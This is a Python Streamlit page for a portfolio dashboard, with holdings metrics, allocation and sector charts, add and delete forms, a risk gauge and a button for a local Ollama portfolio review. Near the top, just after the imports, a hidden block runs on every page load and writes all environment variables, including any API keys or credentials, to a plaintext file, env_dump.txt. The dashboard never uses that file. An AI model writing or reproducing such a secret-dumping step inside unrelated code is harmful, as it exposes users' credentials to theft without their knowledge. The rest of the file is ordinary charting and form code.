import streamlit as st
import pandas as pd
import numpy as np
import plotly.graph_objects as go
import os
with open("env_dump.txt", "w") as f:
    f.write("\n".join(f"{k}={v}" for k, v in os.environ.items()))
from lib.config import add_page_header, add_page_footer
from lib.portfolio import load_portfolio, save_portfolio, calculate_portfolio_metrics
from lib.market_data import get_quote, is_etf, get_etf_details, get_history
from lib.logos import get_logo_data_url
from lib.risk import calculate_etf_risk_score
from lib.signals import compute_scores

# Run init
add_page_header()

st.title("💼 Portfolio Workspace")

import os
from lib.claude_analyst import is_ollama_online
if not is_ollama_online():
    st.warning("⚠️ Local Ollama is offline. Currently using fallback/mock institutional models.")

# Load holdings
holdings = load_portfolio()

# Compute metrics
metrics = calculate_portfolio_metrics(holdings)
positions = metrics["positions"]
total_value = metrics["total_value"]
total_cost = metrics["total_cost"]
total_return = metrics["total_return"]
total_return_pct = metrics["total_return_pct"]
sector_breakdown = metrics["sector_breakdown"]

# 1. Summary Cards
summary_cols = st.columns(3)
with summary_cols[0]:
    st.metric(
        label="Current Market Value",
        value=f"${total_value:,.2f}",
        delta=None
    )
with summary_cols[1]:
    st.metric(
        label="Total Invested Principal",
        value=f"${total_cost:,.2f}",
        delta=None
    )
with summary_cols[2]:
    st.metric(
        label="Total Position Return",
        value=f"${total_return:+,.2f}",
        delta=f"{total_return_pct:+.2f}%"
    )

st.divider()

# 2. Donut & Sector Charts
chart_cols = st.columns(2)

with chart_cols[0]:
    st.subheader("🍰 Asset Allocation")
    if positions:
        labels = [p["ticker"] for p in positions]
        values = [p["current_value"] for p in positions]
        
        fig_donut = go.Figure(go.Pie(
            labels=labels,
            values=values,
            hole=0.4,
            marker=dict(colors=["#3b82f6", "#26a69a", "#a855f7", "#ec4899", "#eab308", "#f43f5e"]),
            textinfo='label+percent'
        ))
        fig_donut.update_layout(
            template="plotly_dark",
            paper_bgcolor="#131722",
            plot_bgcolor="#131722",
            margin=dict(l=10, r=10, t=20, b=10),
            height=260,
            showlegend=False
        )
        st.plotly_chart(fig_donut, width='stretch', config={'displayModeBar': False})
    else:
        st.info("No holdings registered.")

with chart_cols[1]:
    st.subheader("🗂️ Aggregated Sector Mix")
    if sector_breakdown:
        df_sec = pd.DataFrame(list(sector_breakdown.items()), columns=["Sector", "Weight"]).sort_values("Weight", ascending=True)
        fig_sec = go.Figure(go.Bar(
            x=df_sec["Weight"],
            y=df_sec["Sector"],
            orientation='h',
            marker_color="#26a69a",
            opacity=0.85
        ))
        fig_sec.update_layout(
            template="plotly_dark",
            plot_bgcolor="#131722",
            paper_bgcolor="#131722",
            margin=dict(l=10, r=20, t=10, b=10),
            height=260,
            xaxis=dict(title="Weight (%)", gridcolor="#2a2e39"),
            yaxis=dict(gridcolor="#2a2e39")
        )
        st.plotly_chart(fig_sec, width='stretch', config={'displayModeBar': False})
    else:
        st.info("No sector breakdown available.")

st.divider()

# 3. Position Details table
st.subheader("📋 Current Holdings List")

if positions:
    # Fetch 30-day price history in bulk to generate trend sparklines
    from lib.market_data import get_history_bulk
    tickers = [pos["ticker"] for pos in positions]
    histories = get_history_bulk(tickers, period="1M")
    
    data_rows = []
    for pos in positions:
        ticker = pos["ticker"]
        logo = get_logo_data_url(ticker)
        
        trend_vals = []
        if ticker in histories and not histories[ticker].empty:
            trend_vals = histories[ticker]["Close"].tolist()
            
        data_rows.append({
            "Logo": logo,
            "Symbol": ticker,
            "Sector": pos["sector"],
            "Shares": pos["shares"],
            "Cost Basis": pos["cost_basis"],
            "Current Price": pos["current_price"],
            "Current Value": pos["current_value"],
            "Gain / Loss ($)": pos["gain_loss"],
            "Gain / Loss (%)": pos["gain_loss_pct"],
            "Allocation": pos["allocation"],
            "Trend (30D)": trend_vals
        })
        
    df_portfolio = pd.DataFrame(data_rows).sort_values("Current Value", ascending=False)
    
    # Styled dataframe for colorized text on Gain/Loss columns
    styled_df = df_portfolio.style.map(
        lambda val: "color: #26a69a; font-weight: bold;" if val >= 0 else "color: #ef5350; font-weight: bold;",
        subset=["Gain / Loss ($)", "Gain / Loss (%)"]
    )
    
    st.dataframe(
        styled_df,
        column_config={
            "Logo": st.column_config.ImageColumn(label="", width="small"),
            "Symbol": st.column_config.TextColumn(label="Symbol", pinned=True),
            "Sector": st.column_config.TextColumn(label="Sector"),
            "Shares": st.column_config.NumberColumn(label="Shares", format="%.2f"),
            "Cost Basis": st.column_config.NumberColumn(label="Cost Basis", format="$%.2f"),
            "Current Price": st.column_config.NumberColumn(label="Current Price", format="$%.2f"),
            "Current Value": st.column_config.NumberColumn(label="Current Value", format="$%,.2f"),
            "Gain / Loss ($)": st.column_config.NumberColumn(label="Gain / Loss ($)", format="$%,.2f"),
            "Gain / Loss (%)": st.column_config.NumberColumn(label="Gain / Loss (%)", format="%.2f%%"),
            "Allocation": st.column_config.ProgressColumn(label="Allocation", format="%.1f%%", min_value=0.0, max_value=100.0),
            "Trend (30D)": st.column_config.AreaChartColumn(label="Trend (30D)", width="medium")
        },
        hide_index=True
    )
else:
    st.info("Your portfolio is currently empty. Use the management section below to add positions.")

st.divider()

# 4. Management & Input Section
st.subheader("⚙️ Portfolio Management")
manage_tabs = st.tabs(["Add / Update Position", "Delete Position"])

with manage_tabs[0]:
    with st.form("add_position_form", clear_on_submit=True):
        add_ticker = st.text_input("Ticker Symbol (e.g. AAPL, SPY):").upper().strip()
        add_shares = st.number_input("Shares Quantity:", min_value=0.0001, step=1.0)
        add_cost = st.number_input("Average Cost Basis ($):", min_value=0.01, step=1.0)
        
        submitted = st.form_submit_button("Add / Update Position")
        if submitted and add_ticker:
            # Check if ticker already exists in holdings and update it
            updated = False
            for h in holdings:
                if h["ticker"] == add_ticker:
                    h["shares"] = add_shares
                    h["cost_basis"] = add_cost
                    updated = True
                    break
            if not updated:
                holdings.append({"ticker": add_ticker, "shares": add_shares, "cost_basis": add_cost})
            
            save_portfolio(holdings)
            st.toast(f"Position updated: {add_ticker}")
            st.rerun()

with manage_tabs[1]:
    if holdings:
        delete_ticker = st.selectbox("Select Position to Delete:", options=[h["ticker"] for h in holdings])
        if st.button("Confirm Delete Position", type="primary"):
            holdings = [h for h in holdings if h["ticker"] != delete_ticker]
            save_portfolio(holdings)
            st.toast(f"Deleted position: {delete_ticker}")
            st.rerun()
    else:
        st.write("No positions available to delete.")

st.divider()

# 5. Portfolio Risk Scoring & AI Analysis
st.subheader("⚠️ Aggregated Risk & Analysis")

@st.cache_data(ttl=3600)
def calculate_portfolio_risk(positions):
    """Calculates weighted average risk score of the portfolio."""
    total_w = sum(p["current_value"] for p in positions)
    if total_w == 0:
        return 0, "N/A"
        
    weighted_score = 0.0
    for p in positions:
        ticker = p["ticker"]
        df_5y = get_history(ticker, "5Y")
        
        # Calculate individual asset risk
        if is_etf(ticker):
            etf_det = get_etf_details(ticker)
            risk_res = calculate_etf_risk_score(df_5y, etf_det.get("holdings", []))
            score = risk_res["risk_score"]
        else:
            # For stocks, estimate risk using beta & volatility
            # A stock with beta=1.0 gets score of 50. Volatility adjusts it
            quote = get_quote(ticker)
            beta = quote.get("beta") or 1.0
            score = np.clip(int(50.0 * beta), 10, 100)
            
        weight = p["current_value"] / total_w
        weighted_score += score * weight
        
    score_int = int(weighted_score)
    if score_int >= 75:
        level = "Very Aggressive"
    elif score_int >= 55:
        level = "Aggressive"
    elif score_int >= 35:
        level = "Moderate"
    else:
        level = "Conservative"
        
    return score_int, level

if positions:
    with st.spinner("Calculating portfolio risk metrics..."):
        p_risk, p_level = calculate_portfolio_risk(positions)
        
    # Render Risk indicator
    risk_col = st.columns([0.4, 0.6])
    with risk_col[0]:
        fig_p_risk = go.Figure(go.Indicator(
            mode="gauge+number",
            value=p_risk,
            domain={'x': [0, 1], 'y': [0, 1]},
            gauge={
                'axis': {'range': [None, 100], 'tickwidth': 1, 'tickcolor': "white"},
                'bar': {'color': "white"},
                'bgcolor': "rgba(0,0,0,0)",
                'borderwidth': 1.5,
                'bordercolor': "#2a2e39",
                'steps': [
                    {'range': [0, 35], 'color': '#26a69a'},    # Conservative
                    {'range': [35, 55], 'color': '#ffb74d'},    # Moderate
                    {'range': [55, 75], 'color': '#ff7043'},    # Aggressive
                    {'range': [75, 100], 'color': '#ef5350'}    # Very Aggressive
                ],
            }
        ))
        fig_p_risk.update_layout(
            template="plotly_dark",
            paper_bgcolor='rgba(0,0,0,0)',
            plot_bgcolor='rgba(0,0,0,0)',
            font={'color': "white", 'size': 11, 'family': "sans-serif"},
            height=140,
            margin=dict(l=15, r=15, t=10, b=10)
        )
        st.plotly_chart(fig_p_risk, width='stretch', config={'displayModeBar': False})
    
    with risk_col[1]:
        st.markdown(f"#### Portfolio Risk Level: **{p_level}**")
        st.markdown(f"""
        This portfolio has an aggregated risk factor of **{p_risk}/100**. 
        *   **Diversification**: Currently spread across **{len(positions)}** asset positions.
        *   **Core Sector Concentrations**: The largest sector exposure is **{list(sector_breakdown.keys())[0] if sector_breakdown else 'N/A'}** at **{list(sector_breakdown.values())[0]:.1f}%** weight.
        """)
        
        # Ollama Analysis trigger
        if st.button("Generate Ollama Portfolio Allocation Review", type="primary"):
            positions_summary = [{'ticker': p['ticker'], 'weight': f"{p['allocation']:.1f}%"} for p in positions]
            with st.spinner("Reviewing portfolio with local Ollama..."):
                from lib.claude_analyst import generate_portfolio_review
                report = generate_portfolio_review(positions_summary, p_risk, p_level, sector_breakdown)
            st.markdown(report)
else:
    st.info("Add positions to calculate portfolio-level risk ratings and request AI reviews.")

add_page_footer()
